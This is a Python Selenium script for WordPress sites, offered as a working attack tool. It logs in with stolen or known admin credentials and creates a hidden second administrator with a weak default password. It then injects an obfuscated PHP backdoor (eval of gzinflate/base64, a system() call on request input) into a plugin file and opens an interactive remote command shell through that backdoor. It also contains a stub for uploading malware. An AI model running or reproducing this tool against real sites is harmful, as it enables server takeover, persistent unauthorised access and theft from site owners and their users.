#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from bs4 import BeautifulSoup
import urllib.parse
import argparse, logging, sys

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
P_BACKUP:str

# wait until the element os loaded on the page
def load_element(e_name, e_type='ID', timeout=5):
    try: 
        if e_type == 'ID':
            element_present = EC.presence_of_element_located((By.ID, e_name))
        elif e_type == 'NAME':
            element_present = EC.presence_of_element_located((By.NAME, e_name))
        elif e_type == 'CLASS':
            element_present = EC.presence_of_element_located((By.CLASS_NAME, e_name))
        WebDriverWait(driver, timeout).until(element_present)
    except TimeoutException:
        print(f"Timed out waiting for page to load by element[{e_type}] {e_name}")
        exit(-1)

# Login with username and password
def login(user, password):
    logging.info(f'Login with user: {user}')
    try:
        driver.get(args.url+'/wp-login.php')
        # clear and write to username field
        load_element('user_login')
        driver.find_element_by_id('user_login').clear()
        driver.find_element_by_id('user_login').send_keys(user)
        # clear and write to password field
        load_element('user_pass')
        driver.find_element_by_id('user_pass').clear()
        driver.find_element_by_id('user_pass').send_keys(password)
        # click login button
        load_element('wp-submit')
        driver.find_element_by_id('wp-submit').click()
        if 'Error' in driver.page_source:
            print("Invalider Login")
            exit(-1)
    except Exception as e:
        print(f'Login Failed : {e}')
        exit(-1)

# Create new admin user
def crate_user():
    logging.info(f'Crate User {args.newUser}')
    try:
        if 'users.php' not in driver.page_source:
            print('Current User have no Administartion rights')
            exit(-1)
        load_element('adminmenuwrap') # load menu
        # go to "add new user" page
        driver.find_element_by_xpath("//a[@href ='users.php']").click()
        driver.find_element_by_xpath("//a[@href ='user-new.php']").click() 
        logging.info(f'Current Url: {driver.current_url}')
        logging.info('Create User')
        # write user data in fields
        load_element('user_login')
        driver.find_element_by_id('user_login').send_keys('sele')
        load_element('email')
        driver.find_element_by_id('email').send_keys('sele@example.de')
        load_element('pass1')
        driver.find_element_by_id('pass1').clear()
        driver.find_element_by_id('pass1').send_keys('pw123')
        # select password is weak
        load_element('pw_weak', 'NAME')
        driver.find_element_by_name('pw_weak').click()
        # select role admin
        load_element('role')
        driver.find_element_by_id('role').send_keys('Administrator')
        # click create user button 
        load_element('createusersub')
        driver.find_element_by_id('createusersub').click()
    except Exception as e:
        print(f'Crate User Failed : {e}')
        exit(-1)

# write php backdoor to the plugin file
def write_payload(c_p_name, f_name):
    global P_BACKUP
    logging.info(f'Write Payload in Plugin:{c_p_name} with File:{f_name}')
    # orginal php backdoor "<?php system($_REQUEST[0]); ?>"
    payload = "<?php eval(gzinflate(base64_decode('K64sLknN1VCJD3INDHUNDok2iNW0BgA='))); ?>"
    try:
        # save orginal plugin code for cleanup
        load_element('newcontent')
        P_BACKUP = driver.find_element_by_id('newcontent').get_attribute('value')
        # check if backdoor exists already
        if payload not in P_BACKUP:
            load_element('CodeMirror', 'CLASS')
            codeMirror = driver.find_element_by_class_name('CodeMirror')
            # inject payload at the start of the script
            driver.execute_script("arguments[0].CodeMirror.setValue(arguments[1]);", codeMirror, payload+P_BACKUP)
        else:
            # save orginal plugin code for cleanup
            logging.info('Backdoor exist already')
            P_BACKUP = P_BACKUP.replace(payload,"")
    except Exception as e:
        print(f'Write Payload Failed : {e}')
        exit(-1)

# remove backdoor from plugin file
def cleanup():
    logging.info('Start Cleanup')
    try:
        driver.get(EDIT_PLUGIN_URL)
        # overwrite backdoor with orginal plugin code
        load_element('CodeMirror', 'CLASS')
        codeMirror = driver.find_element_by_class_name("CodeMirror")
        driver.execute_script("arguments[0].CodeMirror.setValue(arguments[1]);", codeMirror, P_BACKUP)
        load_element('submit')
        driver.find_element_by_xpath("//input[@value='Update File']").click()
        load_element('notice-success','CLASS',20) # wait "File edited successfully."
    except Exception as e:
        print(f'Cleanup Failed : {e}')
        exit(-1)

# locate all plugins and choose one to inject the php backdoor
def edit_plugin():
    global EDIT_PLUGIN_URL
    logging.info('Start Edit Plugin')
    try:
        load_element('adminmenuwrap') # load menu
        driver.find_element_by_xpath("//a[@href ='tools.php']").click()
        # check if user can edit plugins (default config: only admin have the rights)
        if 'plugin-editor.php' not in driver.page_source:
                print('Current User have no Administartion rights')
                exit(-1)
        driver.find_element_by_xpath("//a[@href ='plugin-editor.php']").click()
        # Click on warning window
        try:
            driver.find_element_by_class_name('file-editor-warning-dismiss').click()
        except:
            pass
        load_element('plugin')
        p_all = Select(driver.find_element_by_id('plugin')) # Get all plugins
        # check plugin selection
        if len(p_all.options) == 0:
            print('There are no Plugins available')
            exit(-1)
        # ask for plugin name for php backdoor injection
        print("\n| Choose Plugin for Backdoor")
        while True:
            for p in p_all.options:
                print(f'\t - [{p_all.options.index(p)}] {p.text}')
            num = input('Plugin Nummber: ')
            if num.isdigit() and int(num) >=0 and int(num) < len(p_all.options):
                break
            else: 
                print('Wrong Input: Choose a Plugin Nummber')
        c_p_name = p_all.options[int(num)].text
        driver.find_element_by_id('plugin').send_keys(c_p_name)
        # click plugin select button
        load_element('submit')
        driver.find_element_by_xpath("//input[@value='Select']").click()
        url_edit = urllib.parse.unquote(driver.current_url)
        print(url_edit)
        # get plugin name and file name 
        pf_name = url_edit.split('=')[-2].split('&')[0]
        p_name = pf_name.split('/')[0]
        f_name = pf_name.split('/')[1]
        logging.info(f'Current Url: {url_edit}')
        EDIT_PLUGIN_URL = driver.current_url
        write_payload(p_name, f_name)
        # click save edit plugin 
        driver.find_element_by_xpath("//input[@value='Update File']").click()
        load_element('notice-success','CLASS',20) # wait "File edited successfully."
    except Exception as e:
        print(f"Edit Plugin Fail : {e}")
        exit(-1)
    return p_name, f_name

# check if plugin file exists and working
def check_backdoor(p_name, f_name):
    logging.info('Check Backdoor')
    try:
        driver.get(f'{args.url}/wp-content/plugins/{p_name}/{f_name}')
        logging.info(f'Current Url: {urllib.parse.unquote(driver.current_url)}')
        if '404' in driver.page_source:
            print('Backdoor is missing or dont work')
            exit(-1)
    except Exception as e:
        print(f'Check Backdoor Failed : {e}')
        exit(-1)
    logging.info("Backdoor Online")    
    
def upload_malware():
    pass

# execute remote commands via http request
def cmd():
    backdoor_url = driver.current_url # URL where the backdoor is located
    logging.info(f'Execute code at: {backdoor_url}')
    # wait for user input
    while True:
        try:
            cmd = input("$ ")
            if cmd.lower() == 'exit': # exit script
                driver.quit()
                exit()
            elif cmd.lower() == 'cleanup': # start cleanup
                cleanup()
                break
            elif 'uplad' in cmd.lower(): # upload malware to target server
                upload_malware()
            else: # send os command
                driver.get(f'{backdoor_url}?0={cmd}')
                cleantext = BeautifulSoup(driver.page_source, "lxml").text # remove html code from command output
                if 'HTTP ERROR 500' not in cleantext:
                    print(cleantext)
        except KeyboardInterrupt:
            exit()
        except Exception as e:
            print(f'Comamnd Execution ERROR : {e}')

def main():
    print("\n| Start Selenium Script")
    login(args.user, args.password)
    # Crate new admin user
    if not args.skipCreate:    
        crate_user()
        login(args.newUser,args.newPassword)
    # Inject php backdoor in plugin
    if not args.skipBackdoor:
        p_name, f_name = edit_plugin()
        check_backdoor(p_name, f_name)
        cmd()
    driver.get(args.url+'/wp-admin/index.php')
    print("\n| End")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Selenium script that create a second User with Administrator role and place a php backdoor in a plugin file for remote command execution')
    parser.add_argument('--url', required=True, type=str, help='Target Wordpress Url')
    parser.add_argument('-U', '--user', required=True, type=str, help='Admin Username')
    parser.add_argument('-P', '--password', required=True, type=str, help='Admin Password')
    parser.add_argument('-d', '--driver', required=True, help='Path to the chromedriver')
    parser.add_argument('-nU', '--newUser', nargs='?', default='sele', type=str, help='New User: Usename (Default: sele)')
    parser.add_argument('-nP', '--newPassword', nargs='?', default='pw123', type=str, help='New User: Password (Default: pw123)')
    parser.add_argument('-sC', '--skipCreate', action=argparse.BooleanOptionalAction, default=False, help='Dont create new admin user')
    parser.add_argument('-sB', '--skipBackdoor', action=argparse.BooleanOptionalAction, default=False, help='Dont inject php backdoor in plugin code')
    parser.add_argument('-H', '--headless', action=argparse.BooleanOptionalAction, default=False, help='Set ChromeOption headless for no window')
    parser.add_argument('-log', '--level', default=20, type=int, help='Set Logging Level')
    args = parser.parse_args()

    args.url = args.url.rstrip('/')
    options = None
    if args.headless:
        options = webdriver.ChromeOptions()
        options.add_argument("log-level=3")
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_argument('headless')
        options.add_argument("disable-gpu")
    driver = webdriver.Chrome(args.driver, chrome_options=options)
    driver.set_window_size(1100,900)

    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
    main()


    
